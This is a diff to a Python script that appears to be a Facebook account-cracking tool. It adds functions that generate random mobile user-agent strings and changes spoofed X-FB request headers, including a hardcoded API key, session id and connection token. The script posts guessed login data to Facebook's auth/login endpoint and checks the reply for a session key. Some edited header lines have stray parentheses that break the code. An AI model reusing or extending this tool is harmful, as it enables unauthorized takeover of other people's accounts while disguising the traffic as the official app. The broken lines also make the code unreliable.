@@ -304,6 +304,30 @@ for agent in range(random.randint(89999, 100000)):
     fullagent=f'{a}{aa}{a1} {b} {n} {c};  {m}{d}{e}{f}) {g}{o}.{p}.{q} {r}{h}.{i}.{j}.{k} {l}{ll}.{l1}.{l2} {l3}{l4} {l5}{s}.{t}'
     ugen.append(fullagent)
     
+def randBuildLSB():
+    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+    VAPP = random.randint(410000000,499999999)
+    END = 'Mozilla/5.0 (Linux; Android 10; Infinix X690B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+
+def randFBAN():
+  VAPP = random.randint(410000000,499999999)
+  ua="Mozilla/5.0 (Linux; Android 10; SM-A207F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]"
+  return ua
+
+def randBuildvsskj():
+    END = 'Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/356.0.0.28.112;]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/DANGER2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+  
+  # Generate random iOS version and build
+ios_version = f"{random.randint(10, 15)}_{random.randint(0, 9)}_{random.randint(0, 9)}"
+ios_build = f"Mobile/{random.randint(10000, 19999)}"
+
+# Create the randomized User-Agent string
+custom_ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_version} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ios_version} {ios_build} Safari/605.1.15"
+
 sys.stdout.write('\x1b]2; DANGER\x07')
 S = '\033[1;37m'
 A = '\x1b[38;5;208m'
@@ -440,20 +464,21 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
+
                 headers = {'User-Agent':randFBAN(),
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-'X-FB-Connection-Type': 'unknown',
+'X-FB-Net-HNI': '38763'),
+'X-FB-SIM-HNI': '29337'),
+'X-FB-Connection-Type': 'MOBILE.LTE',
 'X-Tigon-Is-Retry': 'False',
 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
 'x-fb-device-group': '5120',
 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
 'X-FB-Request-Analytics-Tags': 'graphservice',
 'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'Fales',
-'X-FB-Server-Cluster': 'Fales',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
